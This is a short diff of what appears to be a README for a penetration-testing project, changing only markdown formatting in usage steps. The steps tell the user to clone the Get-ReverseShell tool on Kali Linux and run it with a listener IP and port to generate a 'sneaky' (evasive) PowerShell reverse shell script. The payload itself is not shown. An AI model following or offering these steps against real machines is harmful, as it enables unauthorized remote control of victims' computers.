@@ -31,14 +31,14 @@ $sneaky_psname = "sneaky_reverse_shell.ps1"   # Name of your sneaky reverse shel
 ## Usage
 
 # Kali Linux
-1. Press **Ctrl + Alt + t** for open a first Kali Linux terminal and execute **sudo su** and this following commands:
+1. Press `Ctrl + Alt + t` for open a first Kali Linux terminal and execute **sudo su** and this following commands:
 
 ```bash
 cd $lpath
 git clone https://github.com/gh0x0st/Get-ReverseShell
 cd ./Get-ReverseShell
 ```
-2. Write **pwsh** for open a PowerShell terminal and execute the following commands for create sneaky reverse shell script:
+2. Write `pwsh` for open a PowerShell terminal and execute the following commands for create sneaky reverse shell script:
 ```pwsh
 Import-Module ./get-reverseshell.ps1
 get-reverseshell -Ip $lhost -Port $lport_sneaky
